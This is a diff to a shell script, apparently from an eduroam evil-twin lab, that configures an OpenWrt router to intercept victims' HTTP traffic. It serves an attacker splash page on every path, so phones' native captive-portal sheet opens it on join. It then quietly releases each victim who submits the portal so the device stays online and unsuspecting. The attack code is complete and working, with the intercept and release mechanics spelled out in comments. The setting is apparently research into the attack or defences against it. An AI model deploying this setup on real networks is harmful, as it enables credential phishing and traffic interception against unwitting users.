@@ -6,12 +6,27 @@
 # (443) is deliberately NOT touched - transparent HTTPS needs a MITM CA the victim
 # trusts (Tier 3 / mitmproxy), which is exactly what GECKO prevents.
 #
+# Because the OS captive-portal probe (captive.apple.com / connectivitycheck /
+# ncsi.txt) is itself a plain :80 GET, intercepting :80 makes the phone's native
+# captive sheet pop up on join - no need for the victim to open a browser. The
+# attacker splash is served on *every* path (uhttpd error_page -> index), so the
+# probe's own URL returns it and the sheet shows the page instead of a 404.
+#
+# Keep-connected: a per-client bypass set (edu_released) is inserted at the TOP of
+# dstnat_edu. Once a victim finishes the portal (portal.sh adds their IP via the
+# login CGI), their :80 re-probes skip the redirect and reach the real internet,
+# so iOS marks the network "online" and stops dropping it / disabling auto-join.
+# This only helps if the victim actually HAS upstream, i.e. edu-path.sh is on.
+#
 #   on   add the fw4 DNAT (edu tcp:80 -> 10.98.0.1:8880) + uhttpd attacker page
+#        + the edu_released bypass set/rule (empty until portal.sh releases a client)
 #   off  remove the DNAT (uhttpd instance is left in place, harmless)
 #   status
 #
 # The redirect lives in fw4's per-zone chain dstnat_edu, so it only affects edu
-# traffic - the lan/GeckoTest/openNDS path is never touched.
+# traffic - the lan/GeckoTest/openNDS path is never touched. A full fw4 reload
+# clears the live set/rule (both are re-applied by this script, not by UCI), so
+# re-run `on` after any `/etc/init.d/firewall reload`.
 #
 #   lab/eduroam/attacker/http-intercept.sh on|off|status
 set -euo pipefail
@@ -42,6 +57,9 @@ HTML
 		uci set uhttpd.attacker.home='/www-attacker'
 		uci set uhttpd.attacker.index_page='index.html'
 		uci set uhttpd.attacker.max_requests='50'
+		# Serve the splash on every path (incl. the probe URL /hotspot-detect.html,
+		# /generate_204, /ncsi.txt ...) so the OS captive sheet shows it, not a 404.
+		uci set uhttpd.attacker.error_page='/index.html'
 		uci commit uhttpd
 		/etc/init.d/uhttpd restart >/dev/null 2>&1
 		uci set firewall.atk_http=redirect
@@ -54,8 +72,17 @@ HTML
 		uci set firewall.atk_http.target='DNAT'
 		uci commit firewall
 		/etc/init.d/firewall reload >/dev/null 2>&1
+		# --- per-client release (keep victims connected after they submit the portal) ---
+		# edu_released holds the IPs of victims who finished the portal; the return
+		# rule at the TOP of dstnat_edu makes their :80 re-probes skip the redirect
+		# and reach the real internet, so the OS keeps the network 'online'. Added
+		# live via nft AFTER the fw4 reload above (a later reload clears it -> re-run).
+		nft add set inet fw4 edu_released '{ type ipv4_addr; flags timeout; timeout 2h; }' 2>/dev/null || true
+		nft list chain inet fw4 dstnat_edu 2>/dev/null | grep -q attacker-release \
+			|| nft insert rule inet fw4 dstnat_edu ip saddr @edu_released counter return comment \"attacker-release\"
 	"
 	echo "http-intercept ON: edu port-80 traffic -> attacker page (10.98.0.1:8880). HTTPS untouched."
+	echo "  (OS captive sheet pops on join; portal.sh releases a victim so they stay online.)"
 	;;
 off)
 	"${SSH[@]}" '
@@ -68,6 +95,8 @@ off)
 status)
 	"${SSH[@]}" '
 		echo "fw4 redirect:"; nft list table inet fw4 2>/dev/null | grep "attacker-http-intercept" || echo "  (none)"
+		echo "release rule:"; nft list chain inet fw4 dstnat_edu 2>/dev/null | grep "attacker-release" || echo "  (none)"
+		echo "released IPs:"; nft list set inet fw4 edu_released 2>/dev/null | grep -oE "elements = \{[^}]*\}" || echo "  (none)"
 		echo "attacker page:"; (wget -qO- http://10.98.0.1:8880/ 2>/dev/null || uclient-fetch -qO- http://10.98.0.1:8880/ 2>/dev/null) | grep -o "<title>.*</title>" || echo "  (uhttpd attacker not serving)"
 	'
 	;;
